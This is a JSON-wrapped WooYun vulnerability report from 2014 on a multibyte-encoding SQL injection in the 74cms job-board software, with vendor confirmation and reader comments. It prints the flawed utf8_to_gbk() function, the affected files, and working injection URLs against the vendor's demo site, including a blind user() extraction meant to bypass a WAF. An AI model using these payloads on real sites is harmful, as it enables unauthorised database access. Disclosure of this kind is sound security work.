{"id": 47439, "wybug_id": "wooyun-2014-080490", "wybug_title": "74cms(20141020)全局SQL注入过滤绕过", "wybug_corp": "74c,s.com", "wybug_author": "龟兔赛跑", "wybug_date": "2014-10-27 10:19", "wybug_open_date": "2015-01-25 10:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-31：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-25：\t细节向公众公开  简要描述： 74cms_v3.5.1_20141020绕过全局SQL注入过滤。 详细说明：   WooYun: 74cms 最新版 注入8-9 报道过74cms转换编码导致的SQL注入的问题，是由于使用了iconv()函数导致的，74cms做了修正，转而使用了自定义的函数utf8_to_gbk()来转换编码，代码如下：\nfunction utf8_to_gbk($utfstr) {\tglobal $UC2GBTABLE;\t$okstr = '';\tif(empty($UC2GBTABLE)) {\t\tdefine('CODETABLEDIR', dirname(__FILE__).DIRECTORY_SEPARATOR.'encoding'.DIRECTORY_SEPARATOR);\t\t$filename = CODETABLEDIR.'gb-unicode.table';\t\t$fp = fopen($filename, 'rb');\t\twhile($l = fgets($fp,15)) {        \t\t\t$UC2GBTABLE[hexdec(substr($l, 7, 6))] = hexdec(substr($l, 0, 6));\t\t}\t\tfclose($fp);\t}\t$okstr = '';\t$ulen = strlen($utfstr);\tfor($i=0; $i<$ulen; $i++) {\t\t$c = $utfstr[$i];\t\t$cb = decbin(ord($utfstr[$i]));\t\tif(strlen($cb)==8) { \t\t\t$csize = strpos(decbin(ord($cb)),'0');\t\t\tfor($j = 0; $j < $csize; $j++) {\t\t\t\t$i++; \t\t\t\t$c .= $utfstr[$i];\t\t\t}\t\t\t$c = utf8_to_unicode($c);\t\t\tif(isset($UC2GBTABLE[$c])) {\t\t\t\t$c = dechex($UC2GBTABLE[$c]+0x8080);\t\t\t\t$okstr .= chr(hexdec($c[0].$c[1])).chr(hexdec($c[2].$c[3]));\t\t\t} else {\t\t\t\t$okstr .= '&#'.$c.';';\t\t\t}\t\t} else {\t\t\t$okstr .= $c;\t\t}\t}\t$okstr = trim($okstr);\treturn $okstr;}\n不过这个转换代码还是会导致SQL注入。例如输入为%88%ec%27，经过全局注入addslashes_deep()处理后就把变成了%88%ec%5c%27,utf8_to_gbk()转换过后就变成了： 謜'，导致了'的注入。理论上所有使用utf8_to_gbk(), 然后会带入SQL语句的代码都受影响。\n# grep -nr utf8_to_gbk ../user/company/company_info.php:26:\t$setsqlarr['companyname']=trim($_POST['companyname'])?utf8_to_gbk(trim($_POST['companyname'])):exit('��û��������ҵ���ƣ�');./user/company/company_info.php:29:\t$setsqlarr['nature_cn']=utf8_to_gbk(trim($_POST['nature_cn']));./user/company/company_info.php:31:\t$setsqlarr['trade_cn']=utf8_to_gbk(trim($_POST['trade_cn']));./user/company/company_info.php:34:\t$setsqlarr['district_cn']=utf8_to_gbk(trim($_POST['district_cn']));./user/company/company_info.php:38:\t$setsqlarr['street_cn']=utf8_to_gbk(trim($_POST['street_cn']));./user/company/company_info.php:40:\t$setsqlarr['scale']=trim($_POST['scale'])?utf8_to_gbk(trim($_POST['scale'])):exit('��ѡ����˾��ģ��');./user/company/company_info.php:41:\t$setsqlarr['scale_cn']=utf8_to_gbk(trim($_POST['scale_cn']));./user/company/company_info.php:42:\t$setsqlarr['registered']=utf8_to_gbk(trim($_POST['registered']));./user/company/company_info.php:43:\t$setsqlarr['currency']=utf8_to_gbk(trim($_POST['currency']));./user/company/company_info.php:44:\t$setsqlarr['address']=trim($_POST['address'])?utf8_to_gbk(trim($_POST['address'])):exit('����дͨѶ��ַ��');./user/company/company_info.php:46:\t$setsqlarr['contact']=trim($_POST['contact'])?utf8_to_gbk(trim($_POST['contact'])):exit('����д��ϵ�ˣ�');./user/company/company_info.php:48:\t$setsqlarr['telephone']=trim($_POST['telephone'])?utf8_to_gbk(trim($_POST['telephone'])):exit('����д��ϵ�绰��');./user/company/company_info.php:50:\t$setsqlarr['email']=trim($_POST['email'])?utf8_to_gbk(trim($_POST['email'])):exit('����д��ϵ���䣡');./user/company/company_info.php:52:\t$setsqlarr['website']=utf8_to_gbk(trim($_POST['website']));./user/company/company_info.php:54:\t$setsqlarr['contents']=trim($_POST['contents'])?utf8_to_gbk(trim($_POST['contents'])):exit('����д��˾���飡');./user/user_report_resume.php:189:\t$setsqlarr['content']=utf8_to_gbk($setsqlarr['content']);./user/user_report_resume.php:190:\t$setsqlarr['title']=utf8_to_gbk($setsqlarr['title']);./user/user_apply_jobs.php:302:\t\t\t$addarr['notes']=utf8_to_gbk($addarr['notes']);./user/user_invited.php:347:\t\t$addarr['notes']=utf8_to_gbk($addarr['notes']);./user/personal/personal_resume.php:244:\t$setsqlarr['title']=trim($_POST['title'])?utf8_to_gbk(trim($_POST['title'])):\"δ��������\";./user/personal/personal_resume.php:246:\t$setsqlarr['fullname']=trim($_POST['fullname'])?utf8_to_gbk(trim($_POST['fullname'])):exit('����д������');./user/personal/personal_resume.php:250:\t$setsqlarr['sex_cn']=utf8_to_gbk(trim($_POST['sex_cn']));./user/personal/personal_resume.php:252:\t$setsqlarr['residence']=trim($_POST['residence'])?utf8_to_gbk(trim($_POST['residence'])):exit('��ѡ���־�ס�أ�');./user/personal/personal_resume.php:253:\t$setsqlarr['residence_cn']=utf8_to_gbk(trim($_POST['residence_cn']));./user/personal/personal_resume.php:255:\t$setsqlarr['education_cn']=utf8_to_gbk(trim($_POST['education_cn']));./user/personal/personal_resume.php:257:\t$setsqlarr['experience_cn']=utf8_to_gbk(trim($_POST['experience_cn']));./user/personal/personal_resume.php:258:\t$setsqlarr['email']=trim($_POST['email'])?utf8_to_gbk(trim($_POST['email'])):exit('����д���䣡');./user/personal/personal_resume.php:263:\t$setsqlarr['householdaddress_cn']=utf8_to_gbk(trim($_POST['householdaddress_cn']));\t./user/personal/personal_resume.php:265:\t$setsqlarr['marriage_cn']=utf8_to_gbk(trim($_POST['marriage_cn']));./user/personal/personal_resume.php:266:\t$setsqlarr['intention_jobs']=utf8_to_gbk(trim($_POST['intention_jobs']));./user/personal/personal_resume.php:268:\t$setsqlarr['trade_cn']=utf8_to_gbk(trim($_POST['trade_cn']));./user/personal/personal_resume.php:271:\t$setsqlarr['district_cn']=utf8_to_gbk(trim($_POST['district_cn']));./user/personal/personal_resume.php:273:\t$setsqlarr['nature_cn']=utf8_to_gbk(trim($_POST['nature_cn']));./user/personal/personal_resume.php:275:\t$setsqlarr['wage_cn']=utf8_to_gbk(trim($_POST['wage_cn']));./user/personal/personal_resume.php:394:\t$school = utf8_to_gbk(trim($_POST['school']));./user/personal/personal_resume.php:395:\t$speciality = utf8_to_gbk(trim($_POST['speciality']));./user/personal/personal_resume.php:396:\t$education_cn = utf8_to_gbk(trim($_POST['education_cn']));./user/personal/personal_resume.php:496:\t$companyname = utf8_to_gbk(trim($_POST['companyname']));./user/personal/personal_resume.php:497:\t$jobs = utf8_to_gbk(trim($_POST['jobs']));./user/personal/personal_resume.php:498:\t$achievements = utf8_to_gbk(trim($_POST['achievements']));./user/personal/personal_resume.php:601:\t$agency = utf8_to_gbk(trim($_POST['agency']));./user/personal/personal_resume.php:602:\t$course = utf8_to_gbk(trim($_POST['course']));./user/personal/personal_resume.php:603:\t$description = utf8_to_gbk(trim($_POST['description']));./user/plus/ajax_user.php:32:\t$username=utf8_to_gbk($username);./user/plus/ajax_user.php:33:\t$password=utf8_to_gbk($password);./user/plus/ajax_user.php:41:\t\t$postcaptcha=utf8_to_gbk($postcaptcha);./user/plus/ajax_user.php:73:\t\t$postcaptcha=utf8_to_gbk($postcaptcha);./user/plus/ajax_user.php:87:\t$username=utf8_to_gbk($username);./user/plus/ajax_user.php:88:\t$password=utf8_to_gbk($password);./user/plus/ajax_user.php:134:\t$usname=utf8_to_gbk($usname);./user/plus/ajax_user.php:157:\t$email=utf8_to_gbk($email);./user/user_report.php:189:\t$setsqlarr['content']=utf8_to_gbk($setsqlarr['content']);./user/user_report.php:190:\t$setsqlarr['jobs_name']=utf8_to_gbk($setsqlarr['jobs_name']);./wap/company/wap_company_jobs.php:83:\t$_POST=array_map(\"utf8_to_gbk\", $_POST);./wap/company/wap_company_jobs.php:324:\t$_POST=array_map(\"utf8_to_gbk\", $_POST);./wap/company/wap_user.php:49:\t$_POST=array_map(\"utf8_to_gbk\", $_POST);./wap/personal/wap_apply.php:46:\t$_POST=array_map(\"utf8_to_gbk\", $_POST);./wap/personal/wap_user.php:93:\t$_POST=array_map(\"utf8_to_gbk\",$_POST);./wap/personal/wap_user.php:231:\t$_POST=array_map(\"utf8_to_gbk\",$_POST);./wap/personal/wap_user.php:294:\t$_POST=array_map(\"utf8_to_gbk\",$_POST);./wap/personal/wap_user.php:335:\t$_POST=array_map(\"utf8_to_gbk\",$_POST);./wap/personal/wap_user.php:410:\t$_POST=array_map(\"utf8_to_gbk\",$_POST);./wap/personal/wap_user.php:481:\t$_POST=array_map(\"utf8_to_gbk\",$_POST);./wap/personal/wap_user.php:539:\t$_POST=array_map(\"utf8_to_gbk\",$_POST);./wap/personal/wap_user.php:643:\t$_POST=array_map(\"utf8_to_gbk\", $_POST);./include/common.fun.php:934:function utf8_to_gbk($utfstr) {./plus/ajax_search_location.php:18:$_GET['key']=utf8_to_gbk($_GET['key']);./plus/ajax_simple.php:266:\t$pwd=utf8_to_gbk($pwd);./plus/weixin.php:36:\t\t\t$keyword = utf8_to_gbk($keyword);./plus/ajax_common.php:69:\t$gbk_query=utf8_to_gbk($gbk_query);./plus/ajax_street.php:48:\tif (strcasecmp(QISHI_DBCHARSET,\"utf8\")!=0) $key=utf8_to_gbk($key);./plus/ajax_user.php:32:\t$username=utf8_to_gbk($username);./plus/ajax_user.php:33:\t$password=utf8_to_gbk($password);./plus/ajax_user.php:41:\t\t$postcaptcha=utf8_to_gbk($postcaptcha);./plus/ajax_user.php:73:\t\t$postcaptcha=utf8_to_gbk($postcaptcha);./plus/ajax_user.php:87:\t$username=utf8_to_gbk($username);./plus/ajax_user.php:88:\t$password=utf8_to_gbk($password);./plus/ajax_user.php:134:\t$usname=utf8_to_gbk($usname);./plus/ajax_user.php:157:\t$email=utf8_to_gbk($email);\n这里就不一一尝试了，只是使用其中的一个两个验证一下：1：\nhttp://demo.74cms.com/plus/ajax_common.php?act=hotword&query=%88%ec%27\n返回SQL错误：\nError：Query error:SELECT * FROM qs_hotword WHERE w_word like '%謜'%' ORDER BY `w_hot` DESC LIMIT 0 , 10\n\n\nAND/OR注入绕过安全狗取得user()信息：FALSE的情况，返回所有的hotword：\nhttp://demo.74cms.com/plus/ajax_common.php?act=hotword&query=%88%ec%27%20or%20strcmp(substr(user(),1,14),char(114,111,111,116,64,108,111,99,97,108,104,111,115,115))%23\n\n\nTRUE的情况，:没有任何返回\nhttp://demo.74cms.com/plus/ajax_common.php?act=hotword&query=%88%ec%27%20or%20strcmp(substr(user(),1,14),char(114,111,111,116,64,108,111,99,97,108,104,111,115,116))%23\n\n\n\nuser() = root@localhost\n2：\nhttp://demo.74cms.com/plus/ajax_user.php?act=check_usnamePOST： usname=%88%ec%27\n返回错误：\nError：Query error:select * from qs_members where username = '&#35612;'' LIMIT 1\n\n\n   漏洞证明：  \n\n\n\n   修复方案：  修正utf8_to_gbk()，以及不要过度依赖全局过滤。PS: 传说中的通用性软件安全漏洞奖励呢？为啥没有一个漏洞给过？   版权声明：转载请注明来源 龟兔赛跑@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-10-28 14:24 厂商回复： 感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-27 10:45 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:22        | 还需要等待.........)\t\t \n  ...大牛啊    \n     2014-10-27 10:53 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  屌爆    \n     2014-10-27 10:54 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  前排 掉渣天    \n     2014-10-27 11:09 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  牛逼！    \n     2014-10-27 12:42 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  nice    \n     2014-10-28 14:44 |    \t\t风花雪月 \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:44        | []+[]|[]-[][][][][]%[][]|[]\\[]%[][]|[]\\[...)\t\t \n  敢不敢来个74cms getshell    \n     2014-10-28 21:38 |    \t\t龟兔赛跑 \t\t\t( 普通白帽子  |\t\t\t        Rank:243 漏洞数:29        | 初学者)\t\t \n  @风花雪月 getshell搞不定阿,还没这个能力    \n     2014-10-30 10:04 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n    绕过的意思是能select from了？    \n     2014-10-30 10:17 |    \t\t龟兔赛跑 \t\t\t( 普通白帽子  |\t\t\t        Rank:243 漏洞数:29        | 初学者)\t\t \n  select from还是不能阿,只是不需要二次注入了    \n     2015-01-25 10:55 |    \t\tMark \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 渗透你的心)\t\t \n  注入牛    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}